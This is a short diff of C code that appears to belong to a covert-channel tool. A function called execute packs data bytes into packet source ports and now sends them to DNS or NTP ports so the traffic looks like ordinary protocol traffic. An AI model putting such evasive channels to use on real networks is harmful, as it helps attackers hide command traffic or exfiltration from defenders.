@@ -184,7 +184,10 @@ void execute(char *command, u_int32_t ip, u_int16_t port)
 			uint8 byte = frame[j];
 			src_port = 0xFF00 & SIGNTR << 8;
 			src_port += byte;
-			dst_port = 9001;
+			if (channel == CHAN_DNS)
+				dst_port = PORT_DNS;
+			else
+				dst_port = PORT_NTP;
 
 			usleep(SLEEP_TIME);
 			_send(ip, src_port, dst_port, channel);
